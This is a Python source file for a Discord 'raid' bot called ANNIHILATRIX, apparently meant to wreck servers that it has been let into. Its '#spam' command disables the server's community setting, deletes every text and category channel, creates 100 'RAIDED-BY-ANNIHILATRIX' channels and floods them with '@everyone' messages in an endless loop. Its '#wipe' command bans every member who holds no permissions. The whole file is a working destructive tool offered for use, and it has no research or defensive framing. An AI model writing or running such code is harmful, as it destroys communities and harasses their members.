"""
   ███████╗██████╗ ██╗██████╗  █████╗ ██╗     
   ██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██║     
   █████╗  ██████╔╝██║██║  ██║███████║██║     
   ██╔══╝  ██╔═══╝ ██║██║  ██║██╔══██║██║     
   ███████╗██║     ██║██████╔╝██║  ██║███████╗
   ╚══════╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝

   Created by Spiral
"""

import discord  # type: ignore
from discord.ext import commands  # type: ignore
import asyncio
import os

TOKEN = os.getenv('ANNIHILATRIX')  # Fetch the bot token from the environment variable

# Set up intents for the bot to access specific information in the server
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True
intents.message_content = True  
bot = commands.Bot(command_prefix='#', intents=intents)

sending = False  # Flag to control whether the spam operation is running
spam_lock = asyncio.Lock()  # Lock to ensure no concurrent spam operations

rl_pause = False  # Flag to pause spam messages during rate limiting
timer = 0  # Timer variable to manage rate-limiting

# Function to load the authorized user IDs from a file
def load_authorized_users():
    try:
        with open('.inv', 'r') as file:
            return {int(line.strip()) for line in file}  # Return a set of authorized user IDs
    except FileNotFoundError:
        return set()  # Return an empty set if the file doesn't exist

AUTHORIZED_USER_IDS = load_authorized_users()  # Load authorized users when the bot starts

# Check if the command sender is authorized
def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USER_IDS

@bot.command()
async def spam(ctx, *, spam_message: str = "@everyone RAIDED BY ANNIHILATRIX"):
    global sending  # Use the global sending variable to check if spam is active
    
    if sending:
        await ctx.send("A spam operation is already in progress!")
        return  # If a spam operation is already running, do not start a new one
    
    sending = True  # Set sending to True to indicate spam is starting

    try:
        # Check if the server has the COMMUNITY feature and disable it
        if "COMMUNITY" in ctx.guild.features:
            await ctx.guild.edit(community=False)
    except Exception as e:
        print(f"Failed to edit the guild and turn it into non-community: {e}")

    # Prepare the list of channels to be deleted (text and category channels)
    channels_to_delete = [
        channel.delete() for channel in ctx.guild.channels
        if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.CategoryChannel)
    ]
    
    try:
        # Try to delete all channels in the list
        await asyncio.gather(*channels_to_delete)
    except Exception as e:
        sending = False  # Stop sending if channel deletion fails
        await ctx.send(f"Failed to delete channels: {e}")
        return

    await create_channels_and_spam(ctx, spam_message)  # Proceed to create channels and start spamming

async def create_channels_and_spam(ctx, spam_message: str):
    global sending  # Use the global sending flag
    
    channels_per_batch = 50  # Define how many channels to create per batch
    total_channels = 100  # Total number of channels to be created
    channels_created = 0  # Track how many channels have been created

    while channels_created < total_channels:
        # Create a batch of channels
        batch = [
            ctx.guild.create_text_channel(f'RAIDED-BY-ANNIHILATRIX-{i+1}')
            for i in range(channels_created, min(channels_created + channels_per_batch, total_channels))
        ]
        await asyncio.gather(*batch)  # Execute all channel creation tasks concurrently
        channels_created += len(batch)  # Update the number of channels created
        await asyncio.sleep(1)  # Wait for 1 second before proceeding with the next batch

    await asyncio.sleep(3)  # Wait a moment before starting to send messages

    while sending:  # Keep sending spam messages as long as sending is True
        # Get all text channels where the bot can send messages
        accessible_channels = [
            channel for channel in ctx.guild.channels
            if isinstance(channel, discord.TextChannel) and channel.permissions_for(ctx.guild.me).send_messages
        ]

        tasks = []  # List to hold spam tasks
        async with spam_lock:  # Ensure that spam messages are sent in a controlled manner
            for channel in accessible_channels:
                tasks.append(spam_task(channel, spam_message, 1))  # Add a task to spam each channel

        try:
            # Gather and execute all tasks concurrently
            await asyncio.gather(*tasks)
        except Exception as e:
            sending = False  # Stop sending if an error occurs
            print(f"Error during spamming: {e}")
            return

        await asyncio.sleep(1)  # Wait for 1 second between batches of spam messages

# Task for sending spam messages in a specific channel
async def spam_task(channel, message, count):
    global rl_pause, timer  # Use global flags to control rate-limiting
    try:
        for _ in range(count):
            if rl_pause:
                await asyncio.sleep(timer)  # Pause if rate-limiting is active
                timer = 0  # Reset the timer after pausing
                rl_pause = False  # Reset the rate-limiting flag
            await channel.send(message)  # Send the spam message in the channel
    except discord.HTTPException as e:
        print(f"Failed to send message in {channel.name}: {e}")  # Log any errors during message sending

@bot.command()
async def stop(ctx):
    global sending  # Use the global sending flag
    
    if not sending:
        await ctx.send("Already stopped!")  # Inform the user if no spam operation is in progress
        return
    
    sending = False  # Set sending to False to stop the spam operation
    await ctx.send("Stopped.")  # Inform the user that the spam operation has stopped

@bot.command()
async def wipe(ctx):
    guild = ctx.guild  # Get the guild (server)
    ban_reason = "PUT_CUSTOM_BAN_REASON_HERE"  # Set a custom ban reason

    # List of members to ban (non-bot members with no permissions)
    members_to_ban = [
        member for member in guild.members 
        if not member.bot and not any(perm for perm in member.guild_permissions if perm)
    ]

    batch_size = 50  # Ban members in batches of 50
    total_members = len(members_to_ban)  # Total number of members to ban

    for i in range(0, total_members, batch_size):
        batch = members_to_ban[i:i + batch_size]
        for member in batch:
            try:
                await member.ban(reason=ban_reason)  # Attempt to ban the member
                print(f"Banned {member}")  # Log the banning action
            except discord.Forbidden:
                print(f"Failed to ban {member}: Lacking permissions")  # Handle lack of permissions error
            except discord.HTTPException as e:
                print(f"Failed to ban {member}: {e}")  # Handle other HTTP exceptions
            except Exception as e:
                print(f"Unexpected error with {member}: {e}")  # Handle unexpected errors
        
        await asyncio.sleep(1)  # Wait for 1 second before proceeding to the next batch

    await ctx.send("Task Finished.")  # Inform the user when the task is complete

bot.run(TOKEN)  # Run the bot with the specified token
